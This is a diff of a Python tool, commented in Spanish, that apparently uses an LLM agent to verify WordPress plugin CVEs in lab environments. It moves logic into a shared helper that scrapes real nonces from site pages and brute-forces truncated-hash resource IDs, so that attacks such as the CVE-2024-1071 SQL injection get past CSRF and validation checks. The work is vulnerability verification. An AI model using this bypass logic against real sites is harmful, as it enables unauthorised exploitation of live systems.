@@ -231,6 +231,116 @@ def _resolve_endpoint_placeholders(endpoint: str, html_sources: list) -> tuple:
     return new_endpoint, resolved
 
 
+def _auto_resolve_wp_blockers(boot: "_LabSession", lab: "_Lab", slug: str, http_method: str,
+                              endpoint: str, base_params: dict, exclude_param: str,
+                              res: WpVerifyResult, step,
+                              extra_nonce_pages: Optional[list] = None) -> tuple:
+    """Punto de entrada UNICO y compartido por CUALQUIER verificador dinamico de WordPress (no
+    solo SQLi) para resolver, antes de construir el ataque real, los bloqueos de infraestructura
+    mas comunes que no tienen nada que ver con la tecnica en si: un nonce/token sin resolver
+    (como placeholder literal en el endpoint, p.ej. '{nonce}', o como parametro suelto con un
+    valor sintetico) y un ID de recurso ofuscado (hash truncado) -- los mismos mecanismos
+    confirmados en vivo contra CVE-2024-1071 (Ultimate Member, SQLi), extraidos aqui para que
+    cualquier verify_* que construya una peticion con `base_params`+`endpoint` contra
+    `boot.sub_sess` los reciba igual, sin duplicar esta logica en cada uno.
+
+    `exclude_param` es el parametro que la tecnica en si va a inyectar/manipular -- nunca se
+    toca, aunque su nombre tenga pinta de nonce/token/id (p.ej. un parametro llamado 'token' que
+    es precisamente el que se esta probando para IDOR). `extra_nonce_pages`: ver
+    verify_wordpress_sqli.
+
+    Devuelve `(endpoint, base_params)` ya resueltos lo mejor posible. Deja constancia en
+    `res.evidence` de lo que se resolvio ('placeholders_resueltos', 'endpoint_tras_resolver_'
+    'placeholders', 'parametros_resueltos_con_valor_real') y, si NINGUNA pagina real del sitio
+    mostro rastro del plugin, de 'nonce_scraping_diagnostico' -- la pista que el bucle de
+    aprendizaje-y-reintento del LLM (ver _GENERIC_RETRY_SYS/_SQLI_RETRY_SYS en cve_agent.py)
+    necesita para poder proponer una pagina/URL de configuracion especifica en el siguiente
+    intento, en vez de quedarse sin ninguna explicacion de por que el scraping no encontro nada."""
+    base_params = dict(base_params)
+    m = (http_method or "GET").upper()
+    nonce_like_keys = [k for k in base_params
+                       if any(h in k.lower() for h in ("nonce", "token", "csrf", "security"))
+                       and k != exclude_param]
+    if re.search(r"\{\w+\}", endpoint or "") or nonce_like_keys:
+        probe_urls = [boot.base_url + "/"]
+        if getattr(boot, "shortcode_page_path", None):
+            probe_urls.append(boot.base_url + boot.shortcode_page_path)
+        probe_urls += _list_real_page_urls(lab)
+        for p in (extra_nonce_pages or []):
+            if p:
+                probe_urls.append(boot.base_url + (p if p.startswith("/") else "/" + p))
+        seen_urls = set()
+        probe_urls = [u for u in probe_urls if not (u in seen_urls or seen_urls.add(u))]
+        html_sources = []
+        for u in probe_urls:
+            try:
+                html_sources.append(boot.sub_sess.get(u, timeout=15).text or "")
+            except Exception:
+                pass
+        endpoint, resolved = _resolve_endpoint_placeholders(endpoint, html_sources)
+        if resolved:
+            step(f"endpoint traia placeholder(s) sin resolver {list(resolved)} -- "
+                 f"rellenados con valores reales raspados de entre {len(probe_urls)} "
+                 f"pagina(s) reales del sitio")
+            res.evidence["placeholders_resueltos"] = resolved
+        res.evidence["endpoint_tras_resolver_placeholders"] = endpoint
+        nonces_found = _scrape_nonce_candidates("\n".join(html_sources))
+        if nonce_like_keys and nonces_found:
+            resolved_params = {}
+            for k in nonce_like_keys:
+                base_params[k] = nonces_found[0]
+                resolved_params[k] = nonces_found[0]
+            step(f"parametro(s) {list(resolved_params)} parecen nonce/token -- sustituidos por "
+                 f"un valor REAL raspado de entre {len(probe_urls)} pagina(s) reales del sitio "
+                 f"(el que trajo el PoC/LLM es, como mucho, una adivinanza)")
+            res.evidence["parametros_resueltos_con_valor_real"] = resolved_params
+        if not nonces_found and not resolved:
+            res.evidence["nonce_scraping_diagnostico"] = (
+                f"se probaron {len(probe_urls)} pagina(s) reales ya publicadas del sitio "
+                f"(incluida la portada) y NINGUNA tenia un nonce ni ningun rastro visible del "
+                f"plugin '{slug}' -- puede que el plugin necesite un paso de configuracion "
+                f"propio (p.ej. crear sus paginas por defecto via una accion de administrador) "
+                f"antes de que su contenido aparezca en ningun lado")
+
+    other_id_params = [k for k in base_params
+                       if k != exclude_param and k not in nonce_like_keys
+                       and any(h in k.lower() for h in ("id", "dir"))]
+    remaining_placeholders = [ph for ph in re.findall(r"\{(\w+)\}", endpoint or "")
+                              if any(h in ph.lower() for h in ("id", "dir"))]
+    for k in other_id_params:
+        def _probe_param_id(cand, _k=k):
+            payload = dict(base_params)
+            payload[_k] = cand
+            r = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                      data=payload if m != "GET" else None,
+                                      params=payload if m == "GET" else None, timeout=15)
+            return '"success":true' in (r.text or "")
+        found = _discover_hashed_resource_id(_probe_param_id)
+        if found:
+            base_params[k] = found
+            step(f"parametro '{k}' parece un ID ofuscado -- encontrado un valor ACEPTADO por "
+                 f"el servidor tras probar el esquema de hash truncado conocido (confirmado en "
+                 f"vivo, Ultimate Member/CVE-2024-1071): {found}")
+            res.evidence.setdefault("parametros_resueltos_con_valor_real", {})[k] = found
+    for ph in remaining_placeholders:
+        def _probe_endpoint_id(cand, _ph=ph, _endpoint=endpoint):
+            cand_endpoint = _endpoint.replace("{" + _ph + "}", cand)
+            r = boot.sub_sess.request(m, boot.base_url + cand_endpoint,
+                                      data=dict(base_params) if m != "GET" else None,
+                                      params=dict(base_params) if m == "GET" else None,
+                                      timeout=15)
+            return '"success":true' in (r.text or "")
+        found = _discover_hashed_resource_id(_probe_endpoint_id)
+        if found:
+            endpoint = endpoint.replace("{" + ph + "}", found)
+            step(f"placeholder '{{{ph}}}' del endpoint parece un ID ofuscado -- encontrado un "
+                 f"valor ACEPTADO por el servidor tras probar el esquema de hash truncado "
+                 f"conocido (confirmado en vivo, Ultimate Member/CVE-2024-1071): {found}")
+            res.evidence.setdefault("placeholders_resueltos", {})[ph] = found
+            res.evidence["endpoint_tras_resolver_placeholders"] = endpoint
+    return endpoint, base_params
+
+
 def _redirect_location_is_external(location: str, evil_host: str) -> bool:
     """Confirma que una cabecera Location real redirige de verdad al host externo -- NUNCA un
     simple `evil_host in location` (substring), que da un falso positivo real y confirmado en
@@ -1985,132 +2095,12 @@ def verify_wordpress_sqli(
         m = (http_method or "GET").upper()
         base_params = dict(parameters) if isinstance(parameters, dict) else {p: "1" for p in (parameters or [])}
 
-        # si el endpoint trae placeholders sin resolver (p.ej. llego tal cual de un PoC publico
-        # con 'nonce={nonce}&directory_id={dir_id}'), O alguno de los parametros declarados es un
-        # nonce/token/csrf (el LLM/el PoC publico NUNCA puede saber un nonce de WordPress real --
-        # se genera por sesion/accion -- cualquier valor que traigan es como mucho una adivinanza,
-        # tipicamente "1" o un placeholder literal), rasca valores REALES de una pagina viva ANTES
-        # de construir el ataque -- confirmado en vivo, CVE-2024-1071: sin esto el servidor
-        # rechaza SIEMPRE con 'Wrong Nonce', un bloqueo de infraestructura que no dice nada sobre
-        # si la inyeccion SQL real existe. Funciona igual venga el nonce como placeholder en la
-        # URL o como parametro suelto -- ambas formas se han visto en vivo contra el MISMO CVE,
-        # extraidas por el LLM de maneras distintas del mismo PoC publico.
-        nonce_like_keys = [k for k in base_params
-                          if any(h in k.lower() for h in ("nonce", "token", "csrf", "security"))
-                          and k != sqli_param]
-        if re.search(r"\{\w+\}", endpoint or "") or nonce_like_keys:
-            # probar SOLO la portada ('/') no basta -- confirmado en vivo, CVE-2024-1071: el
-            # exploit publico real (gbrsh/secragon) saca el nonce de '/index.php/register/', una
-            # pagina que Ultimate Member crea SOLO EN SU PROPIA activacion, no de la portada por
-            # defecto (que no tiene nada del plugin atacado). En vez de adivinar el slug concreto
-            # de ESTE plugin, se pregunta a WordPress que paginas existen de verdad y se prueban
-            # todas -- generico, funciona igual para cualquier otro plugin que cree sus propias
-            # paginas al activarse.
-            probe_urls = [boot.base_url + "/"]
-            if boot.shortcode_page_path:
-                probe_urls.append(boot.base_url + boot.shortcode_page_path)
-            probe_urls += _list_real_page_urls(lab)
-            for p in (extra_nonce_pages or []):
-                if p:
-                    probe_urls.append(boot.base_url + (p if p.startswith("/") else "/" + p))
-            seen_urls = set()
-            probe_urls = [u for u in probe_urls if not (u in seen_urls or seen_urls.add(u))]
-            html_sources = []
-            for u in probe_urls:
-                try:
-                    html_sources.append(boot.sub_sess.get(u, timeout=15).text or "")
-                except Exception:
-                    pass
-            new_endpoint, resolved = _resolve_endpoint_placeholders(endpoint, html_sources)
-            if resolved:
-                step(f"endpoint traia placeholder(s) sin resolver {list(resolved)} -- "
-                     f"rellenados con valores reales raspados de entre {len(probe_urls)} "
-                     f"pagina(s) reales del sitio")
-                res.evidence["placeholders_resueltos"] = resolved
-            endpoint = new_endpoint
-            res.evidence["endpoint_tras_resolver_placeholders"] = endpoint
-            nonces_found = _scrape_nonce_candidates("\n".join(html_sources))
-            if nonce_like_keys:
-                if nonces_found:
-                    resolved_params = {}
-                    for k in nonce_like_keys:
-                        base_params[k] = nonces_found[0]
-                        resolved_params[k] = nonces_found[0]
-                    step(f"parametro(s) {list(resolved_params)} parecen nonce/token -- "
-                         f"sustituidos por un valor REAL raspado de entre {len(probe_urls)} "
-                         f"pagina(s) reales del sitio (el que trajo el PoC/LLM es, como mucho, "
-                         f"una adivinanza)")
-                    res.evidence["parametros_resueltos_con_valor_real"] = resolved_params
-            # diagnostico para el bucle de aprendizaje-y-reintento del LLM (ver _SQLI_RETRY_SYS
-            # en cve_agent.py): si NINGUNA de las paginas reales probadas (ni la portada, ni
-            # ninguna ya publicada) tenia un nonce ni se pudo resolver el placeholder del
-            # endpoint, es una pista fuerte de que el plugin atacado no muestra NADA de su propio
-            # contenido todavia -- confirmado en vivo, CVE-2024-1071: Ultimate Member no crea sus
-            # paginas por defecto con la simple activacion, hace falta un paso de configuracion
-            # propio del plugin (ver _PLUGIN_SETUP_TRIGGER_PATHS) -- cuando ese plugin no esta en
-            # el registro (uno nuevo, no visto antes), el LLM puede reconocer el mismo sintoma por
-            # su cuenta y proponer la URL que lo dispara.
-            if not nonces_found and not resolved:
-                res.evidence["nonce_scraping_diagnostico"] = (
-                    f"se probaron {len(probe_urls)} pagina(s) reales ya publicadas del sitio "
-                    f"(incluida la portada) y NINGUNA tenia un nonce ni ningun rastro visible "
-                    f"del plugin '{slug}' -- puede que el plugin necesite un paso de "
-                    f"configuracion propio (p.ej. crear sus paginas por defecto via una accion "
-                    f"de administrador) antes de que su contenido aparezca en ningun lado")
-
-        # algunos plugins no usan IDs de recurso numericos planos (el "1" por defecto que
-        # construye base_params) sino un identificador OFUSCADO -- confirmado en vivo, Ultimate
-        # Member/CVE-2024-1071: su 'directory_id' real es un hash MD5 truncado de un contador
-        # pequeno, y sin el valor correcto el servidor nunca llega a ejecutar el query vulnerable
-        # (se queda en la validacion del directorio). Se detecta probando el esquema conocido
-        # SOLO cuando hay un nonce ya resuelto (si no, cualquier candidato fallaria igual por el
-        # nonce, no por el ID) y existe otro parametro con pinta de ID/directorio distinto del
-        # realmente inyectable -- la convencion de WordPress para exito en AJAX
-        # (`wp_send_json_success()` imprime literalmente '"success":true') es generica, no de
-        # este plugin, asi que la deteccion de "aceptado" funciona para cualquier handler que la
-        # use.
-        # el ID ofuscado puede venir como PARAMETRO suelto (base_params) o como placeholder que
-        # _resolve_endpoint_placeholders no pudo rellenar (su heuristico es "el primer numero
-        # plausible en el HTML" -- un hash no es un numero de pocas cifras, nunca lo encuentra) --
-        # confirmado en vivo, CVE-2024-1071: el exploit real trae el endpoint como
-        # '...&directory_id={dir_id}' con 'directory_id' SOLO en la URL, nunca en 'parameters'.
-        other_id_params = [k for k in base_params
-                           if k != sqli_param and k not in nonce_like_keys
-                           and any(h in k.lower() for h in ("id", "dir"))]
-        remaining_placeholders = [ph for ph in re.findall(r"\{(\w+)\}", endpoint or "")
-                                  if any(h in ph.lower() for h in ("id", "dir"))]
-        for k in other_id_params:
-            def _probe_param_id(cand, _k=k):
-                payload = dict(base_params)
-                payload[_k] = cand
-                r = boot.sub_sess.request(m, boot.base_url + endpoint,
-                                          data=payload if m != "GET" else None,
-                                          params=payload if m == "GET" else None, timeout=15)
-                return '"success":true' in (r.text or "")
-            found = _discover_hashed_resource_id(_probe_param_id)
-            if found:
-                base_params[k] = found
-                step(f"parametro '{k}' parece un ID ofuscado -- encontrado un valor "
-                     f"ACEPTADO por el servidor tras probar el esquema de hash truncado "
-                     f"conocido (confirmado en vivo, Ultimate Member/CVE-2024-1071): {found}")
-                res.evidence.setdefault("parametros_resueltos_con_valor_real", {})[k] = found
-        for ph in remaining_placeholders:
-            def _probe_endpoint_id(cand, _ph=ph):
-                cand_endpoint = endpoint.replace("{" + _ph + "}", cand)
-                r = boot.sub_sess.request(m, boot.base_url + cand_endpoint,
-                                          data=dict(base_params) if m != "GET" else None,
-                                          params=dict(base_params) if m == "GET" else None,
-                                          timeout=15)
-                return '"success":true' in (r.text or "")
-            found = _discover_hashed_resource_id(_probe_endpoint_id)
-            if found:
-                endpoint = endpoint.replace("{" + ph + "}", found)
-                step(f"placeholder '{{{ph}}}' del endpoint parece un ID ofuscado -- encontrado "
-                     f"un valor ACEPTADO por el servidor tras probar el esquema de hash "
-                     f"truncado conocido (confirmado en vivo, Ultimate Member/CVE-2024-1071): "
-                     f"{found}")
-                res.evidence.setdefault("placeholders_resueltos", {})[ph] = found
-                res.evidence["endpoint_tras_resolver_placeholders"] = endpoint
+        # bloqueos de infraestructura comunes a CUALQUIER tecnica contra WordPress (nonce/token
+        # sin resolver, ID de recurso ofuscado) -- ver _auto_resolve_wp_blockers, factorizado
+        # para que todos los verify_* dinamicos lo compartan en vez de duplicar esta logica.
+        endpoint, base_params = _auto_resolve_wp_blockers(
+            boot, lab, slug, m, endpoint, base_params, sqli_param, res, step,
+            extra_nonce_pages=extra_nonce_pages)
 
         orig_value = str(base_params.get(sqli_param) or "1")
 
